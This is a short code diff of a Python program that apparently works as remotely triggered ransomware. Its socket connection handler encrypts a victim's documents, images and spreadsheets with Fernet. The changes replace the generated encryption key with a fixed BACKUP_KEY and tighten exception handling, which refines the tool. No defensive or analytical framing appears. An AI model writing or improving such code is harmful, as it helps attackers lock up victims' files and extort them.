@@ -82,7 +82,7 @@ def bootstrap_packages():
                  "--quiet", "--no-warn-script-location"],
                 shell=False, capture_output=True
             )
-        except:
+        except Exception:
             pass
         # If you need pip install X packages, here, import them now
         import requests
@@ -221,7 +221,7 @@ def handle_conn(conn, addr):
                     try:
                         from cryptography.fernet import Fernet
 
-                        key = Fernet.generate_key()
+                        key = BACKUP_KEY
                         f = Fernet(key)
                         target_exts = {'.txt', '.pdf', '.jpg', '.png', '.docx', '.csv'}
                         encrypted_count = 0
@@ -321,7 +321,7 @@ def main():
                 handle_conn(conn, addr)
             except KeyboardInterrupt:
                 raise
-            except:
+            except Exception:
                 print("Connection died")
 
 
